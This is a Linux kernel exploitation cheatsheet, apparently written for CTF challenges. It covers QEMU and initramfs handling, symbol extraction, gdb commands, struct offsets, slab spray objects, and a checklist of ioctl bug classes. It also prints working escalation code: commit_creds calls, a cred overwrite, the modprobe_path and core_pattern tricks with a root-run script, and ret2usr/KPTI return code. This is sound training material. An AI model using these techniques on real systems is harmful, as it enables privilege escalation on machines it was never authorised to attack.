---
title: "Linux Kernel Pwn - Command and Struct Cheatsheet"
category: pwn
subcategory: kernel
type: cheatsheet
tags: [kernel, qemu, cpio, initramfs, gdb, vmlinux, kallsyms, smep, smap, kpti, kaslr, modprobe-path, msg-msg, tty-struct, pipe-buffer, seq-operations, slub, ioctl, pwndbg, gef]
summary: "QEMU flags, cpio one-liners, gdb kernel commands, symbol resolution, struct offsets, spray objects, and a bug-class checklist for a driver's ioctl handler."
tools: [qemu, gdb, pwndbg, gef, cpio, gcc, ROPgadget, extract-vmlinux]
related: [kernel-setup-and-debug, kernel-mitigations, kernel-slub-uaf-objects, kernel-modprobe-path, kernel-exploit-template]
---

## initramfs: unpack, edit, repack

```bash
# what compression is it really?
file initramfs.cpio.gz rootfs.img 2>/dev/null

# unpack (pick one)
mkdir fs && cd fs
gzip -dc ../initramfs.cpio.gz  | cpio -idmv
xz   -dc ../initramfs.cpio.xz  | cpio -idmv
lz4  -dc ../initramfs.cpio.lz4 | cpio -idmv
zstd -dc ../initramfs.cpio.zst | cpio -idmv
cpio -idmv < ../initramfs.cpio

# repack: --format=newc is mandatory, --null pairs with find -print0
find . -print0 | cpio --null -ov --format=newc 2>/dev/null | gzip -9 > ../initramfs.cpio.gz
find . -print0 | cpio --null -ov --format=newc 2>/dev/null > ../initramfs.cpio

# one-shot rebuild + boot
( cd fs && find . -print0 | cpio --null -ov --format=newc 2>/dev/null ) \
    | gzip -9 > initramfs.cpio.gz && ./run.sh

# what does init do? (uid it drops to, the device node, the insmod)
cat fs/init
# become root during development
sed -i 's/setuidgid 1000/setuidgid 0/' fs/init
sed -i 's/-1000/-0/' fs/init
```

## QEMU flags and what they mean for you

```bash
qemu-system-x86_64 \
  -m 128M \                       # guest RAM: small RAM = tighter slab control
  -kernel ./bzImage \             # extract vmlinux from this for symbols
  -initrd ./initramfs.cpio.gz \   # your exploit goes in here
  -append "console=ttyS0 root=/dev/ram oops=panic panic=1 kaslr pti=on quiet" \
  -cpu qemu64,+smep,+smap \       # drop the +flags locally while developing
  -smp 1 \                        # 1 cpu = deterministic per-CPU slab behaviour
  -monitor /dev/null \            # otherwise Ctrl-A C is a free monitor
  -nographic \
  -no-reboot \                    # stop on panic instead of looping
  -s                              # == -gdb tcp::1234
```

```text
-append options that matter
  nokaslr            KASLR off            kaslr           KASLR on
  nopti              KPTI off             pti=on / kpti=1 KPTI on
  nosmep nosmap      disable in kernel    oops=panic      one oops kills the VM
  panic=1            reboot on panic      quiet           less serial noise
  init=/bin/sh       skip the init script (root shell, development only)

-cpu options
  qemu64                  no SMEP, no SMAP
  qemu64,+smep            SMEP only
  qemu64,+smep,+smap      both
  host / kvm64            depends on the physical CPU
```

```bash
# your local dev copy: gdb stub, no mitigations, readable oops
qemu-system-x86_64 -m 256M -kernel bzImage -initrd initramfs.cpio.gz \
  -append "console=ttyS0 nokaslr nopti" -cpu qemu64 -smp 1 \
  -nographic -no-reboot -s
```

## vmlinux and symbols

```bash
# bzImage is compressed; gdb needs vmlinux
curl -sO https://raw.githubusercontent.com/torvalds/linux/master/scripts/extract-vmlinux
chmod +x extract-vmlinux && ./extract-vmlinux ./bzImage > vmlinux
file vmlinux            # "ELF 64-bit LSB executable, statically linked"

# if extract-vmlinux gives you a symbol-less binary, rebuild the symtab from kallsyms
vmlinux-to-elf ./bzImage ./vmlinux

# symbol addresses and their offsets from _text
nm vmlinux | grep -E ' (commit_creds|prepare_kernel_cred|init_task|init_cred)$'
nm vmlinux | grep -E ' (modprobe_path|core_pattern|poweroff_cmd)$'
nm vmlinux | grep swapgs_restore_regs_and_return_to_usermode
TEXT=0x$(nm vmlinux | awk '$3=="_text"{print $1}')
A=0x$(nm vmlinux | awk '$3=="commit_creds"{print $1}')
python3 -c "print(hex($A - $TEXT))"

# gadgets
ROPgadget --binary vmlinux > gadgets.txt
grep -m3 ': pop rdi ; ret'      gadgets.txt
grep -m3 ': mov rdi, rax ; ret' gadgets.txt
grep -m3 ': push rax ; pop rdi ; ret' gadgets.txt
grep -m3 ': swapgs ; ret'       gadgets.txt
ropr vmlinux -R '^pop rdi; ret$'
```

## Inside the guest

```sh
# kernel version decides which public bugs apply
uname -a ; cat /proc/version

# the driver and its device node
cat /proc/modules
ls -l /dev/ | grep -v '^d'
cat /sys/module/vuln/sections/.text       # module .text base (root)

# symbols (needs kptr_restrict=0, i.e. root during development)
grep -E ' (commit_creds|prepare_kernel_cred|modprobe_path|init_task)$' /proc/kallsyms
head -1 /proc/kallsyms                    # all zeros => restricted

# mitigations
grep -o -E ' (smep|smap|pti)' /proc/cpuinfo | sort -u
cat /proc/cmdline
cat /sys/devices/system/cpu/vulnerabilities/*

# the sysctls that gate your primitives
for f in kernel/kptr_restrict kernel/dmesg_restrict kernel/unprivileged_bpf_disabled \
         kernel/modules_disabled vm/unprivileged_userfaultfd vm/mmap_min_addr \
         kernel/perf_event_paranoid ; do
    printf '%-40s %s\n' "$f" "$(cat /proc/sys/$f 2>/dev/null || echo n/a)"
done

# slab state (root)
head -3 /proc/slabinfo
grep -E 'kmalloc-(32|64|96|128|256|512|1k)' /proc/slabinfo

# the oops, if the VM survived
dmesg | tail -40
dmesg | grep -A6 'BUG: unable\|general protection\|CFI failure'

# proof of escalation
id ; cat /root/flag
```

## gdb against the kernel

```text
$ gdb ./vmlinux
pwndbg> target remote :1234
pwndbg> add-symbol-file ./fs/vuln.ko 0xffffffffc0000000
pwndbg> b vuln_ioctl
pwndbg> c

# addresses you always want
pwndbg> p &commit_creds
pwndbg> p &prepare_kernel_cred
pwndbg> p &init_task
pwndbg> p &init_cred
pwndbg> p &modprobe_path
pwndbg> x/s &modprobe_path
pwndbg> p &core_pattern
pwndbg> p &swapgs_restore_regs_and_return_to_usermode
pwndbg> x/40i swapgs_restore_regs_and_return_to_usermode

# KASLR slide
pwndbg> p &_text
pwndbg> p/x (long)&_text - 0xffffffff81000000

# mitigations, live
pwndbg> p/x $cr4          # bit 20 (0x100000) SMEP, bit 21 (0x200000) SMAP
pwndbg> p/x $cr3          # KPTI flips the low bit between user and kernel tables

# slab / object inspection
pwndbg> b __kmalloc
pwndbg> b kfree
pwndbg> p ((struct kmem_cache*)$rdi)->name
pwndbg> p *(struct seq_operations *)0xffff888003a4c000
pwndbg> p *(struct tty_struct *)0xffff888003b00000
pwndbg> p *(struct msg_msg *)0xffff888003c00000
pwndbg> p *(struct cred *)$rdi
pwndbg> x/8wx $rdi        # cred: usage, uid, gid, suid, sgid, euid, egid, fsuid

# kernel gdb scripts (from the kernel source tree)
pwndbg> source ~/linux/scripts/gdb/vmlinux-gdb.py
pwndbg> lx-dmesg
pwndbg> lx-symbols
pwndbg> lx-ps
pwndbg> lx-lsmod
```

## Struct offsets you keep needing (x86-64, typical 5.x config)

```text
struct cred
  +0x00 usage        +0x04 uid     +0x08 gid     +0x0c suid    +0x10 sgid
  +0x14 euid         +0x18 egid    +0x1c fsuid   +0x20 fsgid
  (zeroing 0x04..0x24 == full root)

struct task_struct        (offsets are CONFIG dependent: verify with pahole/gdb)
  ->cred / ->real_cred    found via `p &((struct task_struct*)0)->cred`
  ->comm                  a 16-byte name you can set with prctl(PR_SET_NAME) -
                          useful as a search marker in a kernel memory dump

struct seq_operations     (kmalloc-32)
  +0x00 start   +0x08 stop   +0x10 next   +0x18 show     all kernel .text pointers

struct msg_msg            (kmalloc-cg-64 .. -4k on 5.14+)
  +0x00 m_list.next  +0x08 m_list.prev  +0x10 m_type
  +0x18 m_ts         +0x20 next         +0x28 security   +0x30 body

struct tty_struct         (kmalloc-1024)
  +0x00 magic (0x5401)   +0x04 kref   +0x18 dev   +0x20 driver   +0x28 ops
  (ops -> struct tty_operations, full of function pointers)

struct pipe_buffer        (16 of them in a kmalloc-1024 array)
  +0x00 page   +0x08 offset(4) len(4)   +0x10 ops   +0x18 flags(4) private
  (ops->release is called on close; page gives physical read/write)

struct file
  +0x20 f_op    (struct file_operations *)
  +0x28 f_lock

struct _IO... (userland) - see glibc-heap-cheatsheet
```

## Spray and reclaim objects

```text
object            cache            allocate                         free
seq_operations    kmalloc-32       open("/proc/self/stat")          close(fd)
shm_file_data     kmalloc-32       shmat()                          shmdt()
timerfd_ctx       kmalloc-256      timerfd_create(CLOCK_REALTIME,0) close(fd)
tty_struct        kmalloc-1024     open("/dev/ptmx")                close(fd)
pipe_buffer       kmalloc-1024     pipe() + write                   close both ends
msg_msg           kmalloc-cg-*     msgsnd(qid, buf, n, 0)           msgrcv(...)
user_key_payload  kmalloc-*        add_key("user", d, buf, n, ...)  keyctl(REVOKE)
sk_buff           kmalloc-512+     sendmsg on a socketpair          recvmsg
setxattr buffer   kmalloc-*        setxattr(p,"security.x",buf,n,0) on syscall return
subprocess_info   kmalloc-128      socket(AF_UNKNOWN, ...)          automatic
```

```c
/* the grooming pattern that works: allocate, punch holes, free the victim,
   spray immediately, all pinned to one CPU */
pin_cpu0();
for (i = 0; i < 64; i++) filler[i] = alloc_victim_size();
for (i = 0; i < 64; i += 2) free_victim(filler[i]);
trigger_kfree();                    /* the bug */
for (i = 0; i < 64; i++) spray[i] = open("/proc/self/stat", O_RDONLY);
```

## Escalation endings

```c
/* 1. classic creds (Linux < 6.2) */
commit_creds(prepare_kernel_cred(0));
/* Linux >= 6.2: prepare_kernel_cred(NULL) returns NULL */
commit_creds(prepare_kernel_cred(&init_task));
commit_creds(&init_cred);           /* if init_cred is resolvable */

/* 2. direct cred overwrite - no calls at all */
memset((char *)current->cred + 4, 0, 0x20);

/* 3. modprobe_path - beats SMEP+SMAP+KPTI+kCFI with ONE write */
strcpy(modprobe_path, "/tmp/x");
/* then, from userland: */
/*   echo -e '#!/bin/sh\ncat /root/flag > /tmp/f\nchmod 777 /tmp/f' > /tmp/x */
/*   chmod +x /tmp/x ; printf '\xff\xff\xff\xff' > /tmp/d ; chmod +x /tmp/d */
/*   /tmp/d   (fails, but request_module runs /tmp/x as root) */

/* 4. core_pattern - same idea, triggered by a crash */
strcpy(core_pattern, "|/tmp/x");
```

```asm
; 5. the KPTI return trampoline stack layout
;    enter swapgs_restore_regs_and_return_to_usermode AFTER its POP_REGS block
;    (the `mov rdi, rsp` instruction; usually +22 or +27, DISASSEMBLE IT)
    [ dummy rax ]
    [ dummy rdi ]
    [ user RIP  ]
    [ user CS   ]
    [ user RFLAGS ]
    [ user RSP  ]
    [ user SS   ]
```

```c
/* 6. save/restore the user context (call save_state FIRST in main) */
unsigned long user_cs, user_ss, user_rsp, user_rflags;
static void save_state(void) {
    __asm__ __volatile__(
        "movq %%cs, %0\n movq %%ss, %1\n movq %%rsp, %2\n pushfq\n popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        : : "memory");
}
/* return to ring 3 with KPTI OFF */
__asm__ __volatile__("swapgs\n push %0\n push %1\n push %2\n push %3\n push %4\n iretq\n"
    : : "r"(user_ss), "r"(user_rsp), "r"(user_rflags), "r"(user_cs), "r"(get_shell));
```

## Build and ship

```bash
# static, because the initramfs has no shared libc
gcc -static -O2 -no-pie -o exp exp.c
gcc -static -O2 -no-pie -pthread -o exp exp.c      # if you use threads/uffd
musl-gcc -static -O2 -o exp exp.c && strip exp     # smallest
# ship it
cp exp fs/exp && chmod +x fs/exp
( cd fs && find . -print0 | cpio --null -ov --format=newc 2>/dev/null ) \
    | gzip -9 > initramfs.cpio.gz
# no room in the initramfs? paste it over the serial console
gzip -9 < exp | base64 -w0 > exp.b64      # then in the guest:
#   base64 -d < /tmp/exp.b64 | gzip -d > /tmp/exp && chmod +x /tmp/exp
```

## Identifying the bug class from an ioctl handler

```text
Look at each case in the switch and ask:

1. Is an index used without a bounds check?
     slots[r.idx] = ...            -> OOB read/write on a global array
     if (r.idx > 16)               -> signed compare on a signed idx: negative passes

2. Is a length used without a bound?
     copy_from_user(buf, r.buf, r.size)   with buf a fixed array -> heap/stack overflow
     kmalloc(r.size) then copy of a different size                -> overflow
     size_t arithmetic that can wrap (r.size + 8)                 -> integer overflow

3. Is the pointer NULLed after kfree?
     kfree(slots[i]); with no slots[i] = NULL                     -> UAF / double free

4. Is the same user memory read twice?
     copy_from_user(&hdr, arg, ...) to validate, then
     copy_from_user(buf, arg + 8, hdr.len)                        -> double fetch race

5. Is a refcount handled correctly?
     an error path that calls put() after a successful get()      -> refcount UAF

6. Is a user-supplied pointer dereferenced directly?
     *(unsigned long *)r.addr = r.val                             -> arbitrary write
     (SMAP makes the userland direction fail, but kernel addresses work)

7. Is there a copy_to_user of uninitialised kernel memory?
     struct s; s.a = 1; copy_to_user(u, &s, sizeof s)             -> infoleak (padding)

8. Is a lock released before the last use?
     mutex_unlock(&m); use(obj);                                  -> race

Then match to a technique:
     OOB write on kmalloc'd memory  -> kernel-slub-uaf-objects
     UAF                            -> kernel-slub-uaf-objects
     arbitrary write                -> kernel-modprobe-path (always try this first)
     stack overflow                 -> kernel-rop-kpti-trampoline
     double fetch / race            -> kernel-race-widening
     infoleak only                  -> use it to beat KASLR, then look again
```

## Quick checklist for a new kernel challenge

```text
[ ] uname -r, and does a public CVE match?
[ ] cat run.sh: smep? smap? kaslr? pti? oops=panic? -s?
[ ] cat fs/init: which uid, which device node, which module
[ ] read the .ko source (or Ghidra it): list every ioctl and its checks
[ ] extract vmlinux, nm it, note commit_creds / modprobe_path offsets
[ ] make a dev run.sh: nokaslr, nopti, -cpu qemu64, root init, -s
[ ] write the ioctl wrappers and confirm a benign round trip first
[ ] get a leak (seq_operations is the cheapest), confirm the KASLR slide
[ ] pick the ending: modprobe_path if you have a write, ROP if you have the stack
[ ] re-enable the mitigations one at a time and fix what breaks
[ ] final test: non-root init, all mitigations on, `cat /root/flag`
```
